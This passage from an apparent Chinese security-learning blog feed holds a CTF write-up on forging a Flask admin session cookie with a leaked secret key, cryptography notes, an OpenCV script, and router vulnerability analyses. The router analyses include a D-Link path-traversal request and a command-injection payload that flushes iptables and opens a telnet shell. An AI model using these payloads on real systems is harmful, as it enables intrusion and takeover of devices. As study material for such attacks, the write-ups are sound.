class="comment">#查找关键点和描述符</span></span><br><span class="line">kp2,des2=surf.detectAndCompute(rightgray,<span class="keyword">None</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">FLANN_INDEX_KDTREE=<span class="number">0</span>   <span class="comment">#建立FLANN匹配器的参数</span></span><br><span class="line">indexParams=dict(algorithm=FLANN_INDEX_KDTREE,trees=<span class="number">5</span>) <span class="comment">#配置索引，密度树的数量为5</span></span><br><span class="line">searchParams=dict(checks=<span class="number">50</span>)    <span class="comment">#指定递归次数</span></span><br><span class="line"><span class="comment">#FlannBasedMatcher：是目前最快的特征匹配算法（最近邻搜索）</span></span><br><span class="line">flann=cv2.FlannBasedMatcher(indexParams,searchParams)  <span class="comment">#建立匹配器</span></span><br><span class="line">matches=flann.knnMatch(des1,des2,k=<span class="number">2</span>)  <span class="comment">#得出匹配的关键点</span></span><br><span class="line"> </span><br><span class="line">good=[]</span><br><span class="line"><span class="comment">#提取优秀的特征点</span></span><br><span class="line"><span class="keyword">for</span> m,n <span class="keyword">in</span> matches:</span><br><span class="line">    <span class="keyword">if</span> m.distance &lt; <span class="number">0.7</span>*n.distance: <span class="comment">#如果第一个邻近距离比第二个邻近距离的0.7倍小，则保留</span></span><br><span class="line">        good.append(m)</span><br><span class="line">src_pts = np.array([ kp1[m.queryIdx].pt <span class="keyword">for</span> m <span class="keyword">in</span> good])    <span class="comment">#查询图像的特征描述子索引</span></span><br><span class="line">dst_pts = np.array([ kp2[m.trainIdx].pt <span class="keyword">for</span> m <span class="keyword">in</span> good])    <span class="comment">#训练(模板)图像的特征描述子索引</span></span><br><span class="line">H=cv2.findHomography(src_pts,dst_pts)         <span class="comment">#生成变换矩阵</span></span><br><span class="line">h,w=leftgray.shape[:<span class="number">2</span>]</span><br><span class="line">h1,w1=rightgray.shape[:<span class="number">2</span>]</span><br><span class="line">shft=np.array([[<span class="number">1.0</span>,<span class="number">0</span>,w],[<span class="number">0</span>,<span class="number">1.0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1.0</span>]])</span><br><span class="line">M=np.dot(shft,H[<span class="number">0</span>])            <span class="comment">#获取左边图像到右边图像的投影映射关系</span></span><br><span class="line">dst_corners=cv2.warpPerspective(leftgray,M,(w*<span class="number">2</span>,h))<span class="comment">#透视变换，新图像可容纳完整的两幅图</span></span><br><span class="line">cv2.imshow(<span class="string">'tiledImg1'</span>,dst_corners)   <span class="comment">#显示，第一幅图已在标准位置</span></span><br><span class="line">dst_corners[<span class="number">0</span>:h,w:w*<span class="number">2</span>]=rightgray  <span class="comment">#将第二幅图放在右侧</span></span><br><span class="line">cv2.imwrite(<span class="string">'tiled.jpg'</span>,dst_corners)</span><br><span class="line">cv2.imshow(<span class="string">'tiledImg'</span>,dst_corners)</span><br><span class="line">cv2.imshow(<span class="string">'leftgray'</span>,leftgray)</span><br><span class="line">cv2.imshow(<span class="string">'rightgray'</span>,rightgray)</span><br><span class="line">cv2.waitKey()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure></p><p>原来博主的代码出了一点小问题，估计是复制粘贴的时候出的错。修改了一下可以运行，效果如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cv.png" alt=""></p><h2>参考</h2><p><a href="https://blog.csdn.net/lhanchao/article/category/6430040" target="_blank" rel="noopener">特征匹配</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;sift算子&lt;/h2&gt;
&lt;p&gt;角点检测技术，比如&lt;code&gt;Harris&lt;/code&gt;等，具有旋转不变性，即使图片发生了旋转，我们也能找到同样的角点。但是对图片进行缩放之后，角点就可能不再是角点了。&lt;/p&gt;
&lt;p&gt;所以我们需要用尺度去描绘一副图片，不同大小的图片描绘的尺度
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
      <category term="opencv" scheme="https://prontosil.club/tags/opencv/"/>
    
  </entry>
  
  <entry>
    <title>python审计之flask</title>
    <link href="https://prontosil.club/2019/10/10/python-shen-ji-zhi-flask/"/>
    <id>https://prontosil.club/2019/10/10/python-shen-ji-zhi-flask/</id>
    <published>2019-10-10T15:13:01.000Z</published>
    <updated>2019-10-11T00:07:54.221Z</updated>
    
    <content type="html"><![CDATA[<p>菜鸡决定对python审计好好复习一下</p><h2>HCTF2018 admin</h2><h3>复现</h3><p>虽然是非预期解但是也很有趣，师傅写的代码也挺棒的</p><p>在修改密码的页面查看源代码发现了一个提示。(不过这个挺难发现的还是要养成多看看源码的习惯)</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ui grid"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"four wide column"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"eight wide column"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"ui form segment"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"field required"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>NewPassword<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"newpassword"</span> <span class="attr">name</span>=<span class="string">"newpassword"</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"ui button fluid"</span> <span class="attr">value</span>=<span class="string">"更换密码"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>之后就可以看到<code>flask</code>的<code>secret_key</code>是<code>ckj123</code></p><p>同时可以看到<code>flag</code>获得的条件</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>hctf&#123;un1c0dE_cHe4t_1s_FuNnying&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p><p>然后就可以伪造session了，抓包后修改session就可以了(Windows的python3跑不了用的WSL中的python3)</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-session-cookie-manager git:(master) python3 session_cookie_manager.py encode -s &apos;ckj123&apos; -t &apos;&#123;&quot;name&quot;:&quot;admin&quot;, &quot;user_id&quot;:&quot;1&quot;&#125;&apos;</span><br><span class="line">eyJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMSJ9.XZ9J5Q.mDSLo4JaAJRZVahOGaLqKCuswD8</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/flask.png" alt=""></p><h3>分析一下源码</h3><p>app目录主要内容，其中<code>code.py</code>是用来产生验证码的，<code>config.py</code>是配置文件，<code>forms.py</code>是表单建模，<code>models.py</code>是一些模型，<code>routers.py</code>是路由</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">├── app</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── __init__.pyc</span><br><span class="line">│   ├── code.py</span><br><span class="line">│   ├── code.pyc</span><br><span class="line">│   ├── config.py</span><br><span class="line">│   ├── config.pyc</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── forms.pyc</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── models.pyc</span><br><span class="line">│   ├── routes.py</span><br><span class="line">│   ├── routes.pyc</span><br><span class="line">│   ├── static</span><br><span class="line">│   └── templates</span><br></pre></td></tr></table></figure></p><p>我们拿到flag的条件就是登陆<code>admin</code>用户，登陆的路由如下：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> 此处current_user是什么意思？它是从flask_login中导入的</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data) <span class="comment">#从表单中获取到name然后存入session中</span></span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, title = <span class="string">'login'</span>, form = form)</span><br></pre></td></tr></table></figure></p><p>这里涉及到了<code>flask</code>的用户认证可以学习一下，令人疑惑的是文档中说了这个<code>is_authenticated</code>方法需要自己实现，但是我并没有在源代码中找到实现了这个方法。</p><p><a href="http://www.pythondoc.com/flask-login/" target="_blank" rel="noopener">参考文档</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;菜鸡决定对python审计好好复习一下&lt;/p&gt;
&lt;h2&gt;HCTF2018 admin&lt;/h2&gt;
&lt;h3&gt;复现&lt;/h3&gt;
&lt;p&gt;虽然是非预期解但是也很有趣，师傅写的代码也挺棒的&lt;/p&gt;
&lt;p&gt;在修改密码的页面查看源代码发现了一个提示。(不过这个挺难发现的还是要养成多看看源码的
      
    
    </summary>
    
      <category term="web" scheme="https://prontosil.club/categories/web/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
      <category term="flask" scheme="https://prontosil.club/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>密码学复习</title>
    <link href="https://prontosil.club/2019/10/10/mi-ma-xue-fu-xi/"/>
    <id>https://prontosil.club/2019/10/10/mi-ma-xue-fu-xi/</id>
    <published>2019-10-10T12:31:07.000Z</published>
    <updated>2019-10-10T13:20:17.136Z</updated>
    
    <content type="html"><![CDATA[<h2>先补习一下数学知识</h2><h3>随机变量</h3><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/crypto1.png" alt=""></p><p>这张ppt中，定义$X(y) = lsb, (y) $  于是可以得出随机变量的概率分布</p><h3>联合随机分布</h3><p>联合随机分布就是指对于$U$中所有的变量，概率都是相等的</p><h3>随机算法</h3><p>这个适合确定性算法相对应的(或许和后面的nounce有关？)</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/crypto3.png" alt=""></p><p><code>r</code>是从<code>{0, 1}^n</code>中的联合随机分布，作为参数输入到函数A中，这样得到的结果y也是随机的</p><h2>secure PRF</h2><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/crypto2.png" alt=""></p><p>挑战者随机选择，攻击者发送一连串的x进行试验，某两次实验的结果相同的概率是可忽略的，则这个PRF就是安全的</p><h3>区分PRP和PRF</h3><p>如下同样的两个算法，对于<code>PRP</code>来说是安全的，但是对于<code>PRF</code>却是不安全的</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/crypto4.png" alt=""></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/crypto5.png" alt=""></p><p>但是不太理解其中的分析，为什么第一次<code>EXP(O) = 1</code>的概率就是0呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;先补习一下数学知识&lt;/h2&gt;
&lt;h3&gt;随机变量&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpic/master/crypto1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这张ppt中
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="密码学" scheme="https://prontosil.club/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="数学" scheme="https://prontosil.club/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>路由器相关RCE漏洞分析</title>
    <link href="https://prontosil.club/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/"/>
    <id>https://prontosil.club/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/</id>
    <published>2019-10-05T12:11:23.000Z</published>
    <updated>2019-10-10T13:20:49.849Z</updated>
    
    <content type="html"><![CDATA[<h2>复习一下基本知识</h2><h3>postgresql数据库操作</h3><p>如果是安装好了<code>postgresql</code>数据库就会新建一个<code>postgreql</code>用户</p><p><code>sudo su - postgres</code>切换到<code>postgresql</code></p><p><code>psql</code>就可以直接登陆</p><p>基本操作如下：</p><p><code>\l</code>列出所有的数据库<code>\c</code>选择数据库<code>\dt</code>列出所有表<code>\d</code>描述表的信息</p><p>使用<code>firmadyne</code>会将信息保存到<code>postgresql</code>数据库中</p><h3>ubuntu安装burp</h3><p><a href="http://labfile.oss.aliyuncs.com/courses/726/burpsuite_free.jar" target="_blank" rel="noopener">下载地址</a></p><p>然后<code>java -jar .jar</code>就可以启动了</p><p><img src="/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/burp" alt="1570279096212"></p><h2>D-Link850L RCE分析</h2><p><a href="https://xz.aliyun.com/t/90?accounttraceid=9e7417ba-17e6-409c-ae12-af7205701caa#toc-0" target="_blank" rel="noopener">参考文章</a></p><p>信息泄露</p><p>位于<code>fatlady.php</code>文件中，很明显的看到了参数拼接的行为</p><p><img src="/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/d-link" alt="1570278079628"></p><p>构造恶意数据发送</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span><span class="tag">&lt;<span class="name">postxml</span>&gt;</span><span class="tag">&lt;<span class="name">module</span>&gt;</span><span class="tag">&lt;<span class="name">service</span>&gt;</span>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml<span class="tag">&lt;/<span class="name">service</span>&gt;</span><span class="tag">&lt;/<span class="name">module</span>&gt;</span><span class="tag">&lt;/<span class="name">postxml</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到其解析了但是并没有返回数据</p><p><img src="/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/burp2.png" alt="1570279397621"></p><p>尝试多次均失败，于是用默认密码直接登录上去</p><p>漏洞点：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$server = query(<span class="string">"/device/time/ntp/server"</span>);</span><br><span class="line">$period = query(<span class="string">"/device/time/ntp/period"</span>);<span class="keyword">if</span> ($period==<span class="string">""</span>) $period=<span class="string">"604800"</span>;</span><br><span class="line">$period6 = query(<span class="string">"/device/time/ntp6/period"</span>);<span class="keyword">if</span> ($period6==<span class="string">""</span>) $period6=<span class="string">"604800"</span>;</span><br><span class="line">$ntp_run = <span class="string">"/var/run/ntp_run.sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($enable==<span class="number">1</span> &amp;&amp; $enablev6==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($server==<span class="string">""</span>) fwrite(a, $START, <span class="string">'echo "No NTP server, disable NTP client ..." &gt; /dev/console\n'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fwrite(w, $ntp_run, <span class="string">'#!/bin/sh\n'</span>);</span><br><span class="line">fwrite(a, $ntp_run,</span><br><span class="line"><span class="string">'echo "Run NTP client ..." &gt; /dev/console\n'</span>.</span><br><span class="line"><span class="string">'echo [$1] [$2] &gt; /dev/console\n'</span>.</span><br><span class="line"><span class="string">'STEP=$1\n'</span>.</span><br><span class="line"><span class="string">'RESULT="Null"\n'</span>.</span><br><span class="line"><span class="string">'xmldbc -s /runtime/device/ntp/state RUNNING\n'</span>.</span><br><span class="line"><span class="string">'SERVER4='</span>.$server.<span class="string">'\n'</span>.</span><br><span class="line"><span class="string">'SERVER6=`xmldbc -g /runtime/device/ntp6/server | cut -f 1 -d " "`\n'</span>.</span><br><span class="line"><span class="string">'if [ "$STEP" == "V4" ]; then\n'</span>.</span><br><span class="line"><span class="string">'xmldbc -t "ntp:'</span>.$period.<span class="string">':'</span>.$ntp_run.<span class="string">' $STEP"\n'</span>.</span><br><span class="line"><span class="string">'echo "ntpclient -h $SERVER4 -i 5 -s -4" &gt; /dev/console\n'</span>.</span><br><span class="line"><span class="string">'ntpclient -h $SERVER4 -i 5 -s -4 &gt; /dev/console\n'</span>.</span><br></pre></td></tr></table></figure></p><p>这里直接把<code>$server</code>变量拼接在了命令执行的代码中，存在命令注入</p><p>首先，获取DEVICE.TIME服务的xml文件格式</p><p><img src="/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/burp4.png" alt="1570281211621"></p><p>&lt;center&gt;但是格式好像有问题&lt;/center&gt;</p><p>使用如下payload尝试</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">postxml</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">service</span>&gt;</span>DEVICE.TIME<span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">device</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">time</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ntp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">enable</span>&gt;</span>1<span class="tag">&lt;/<span class="name">enable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">period</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">period</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span>metelesku;(iptables -F ;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;telnetd -p 23090 -l /bin/date) &amp;amp; exit;<span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ntp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ntp6</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">enable</span>&gt;</span>1<span class="tag">&lt;/<span class="name">enable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">period</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">period</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ntp6</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">timezone</span>&gt;</span>63<span class="tag">&lt;/<span class="name">timezone</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">time</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">date</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dst</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dst</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dstmanual</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dstoffset</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">time</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">device</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">postxml</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>但是还是失败了</p><p><img src="/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/burp3.png" alt="1570280943430"></p><h2>DIR-619L&amp;605L 栈溢出漏洞</h2><p>漏洞点在<code>/bin/boa</code>程序处</p><p>通过<code>ghidra</code>反编译代码可以看到：</p><p><code>formLanguageChange</code>函数</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (pcVar2 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(local_f8,__s1,(<span class="keyword">size_t</span>)(pcVar2 + -(<span class="keyword">int</span>)__s1));</span><br><span class="line">      local_f8[(<span class="keyword">int</span>)(pcVar2 + -(<span class="keyword">int</span>)__s1)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00460b34;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar3 = websGetVar(uParm1,<span class="string">"currTime"</span>,&amp;DAT_004ac874);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//formLanguageChange接下来调用了sprintf危险函数向local_f8变量中读入参数内容</span></span><br><span class="line">  <span class="built_in">sprintf</span>(local_f8,<span class="string">"%s?t=%s"</span>,__s1,uVar3);</span><br><span class="line">LAB_00460b34:</span><br><span class="line">  websRedirect(uParm1,local_f8); <span class="comment">//websRedirect使用了local_f8作为参数。</span></span><br><span class="line">  system(<span class="string">"echo 4 &gt; /proc/gpio"</span>);</span><br><span class="line">  iVar1 = apmib_update(<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><p><code>websGetVar</code>函数获取到参数之火传入<code>uVar3</code>变量，之后<code>sprintf</code>函数将其写入到<code>local_f8</code>中，再调用<code>websRedirect</code>函数进行URL跳转</p><p><code>websGetVar</code>函数</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//websGetVar通过malloc、memcpy将获取到的参数返回给formLanguageChange。</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-1</span> &lt; (<span class="keyword">int</span>)__n) &#123;</span><br><span class="line">    pvParm3 = <span class="built_in">malloc</span>(__n + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pvParm3,query_temp_var,__n);</span><br><span class="line">    *(undefined *)((<span class="keyword">int</span>)pvParm3 + __n) = <span class="number">0</span>;</span><br><span class="line">    addTempStr(pvParm3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> pvParm3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续分析<code>websRedirect</code>函数</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined4 <span class="title">websRedirect</span><span class="params">(<span class="keyword">int</span> iParm1,<span class="keyword">char</span> *pcParm2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pcVar1;</span><br><span class="line">  </span><br><span class="line">  *(undefined4 *)(iParm1 + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">  pcVar1 = <span class="built_in">strstr</span>(pcParm2,<span class="string">"/apply_setting.asp"</span>);</span><br><span class="line">  <span class="keyword">if</span> (pcVar1 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    apply_setting_redirect = apply_setting_redirect + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  send_r_moved_perm(iParm1,pcParm2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到调用了<code>send_r_moved_perm</code>函数</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">req_write(iParm1,uVar1);</span><br><span class="line">req_write(iParm1,&amp;DAT_004a1f14);</span><br><span class="line">pcVar2 = <span class="built_in">strstr</span>(pcParm2,<span class="string">"http://"</span>);</span><br><span class="line"><span class="keyword">if</span> (pcVar2 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (*pcParm2 == <span class="string">'/'</span>) &#123;</span><br><span class="line">    pcParm2 = pcParm2 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(acStack224,<span class="string">"http://%s/%s"</span>,*(undefined4 *)(iParm1 + <span class="number">0x70</span>),pcParm2);</span><br><span class="line">  pcParm2 = acStack224;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(acStack480,</span><br><span class="line">                  </span><br><span class="line">        <span class="string">"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;\r\n\t\tThis document has moved to a new &lt;ahref=\"%s\"&gt;location&lt;/a&gt;.\r\n\t\tPlease update your documents to reflect the 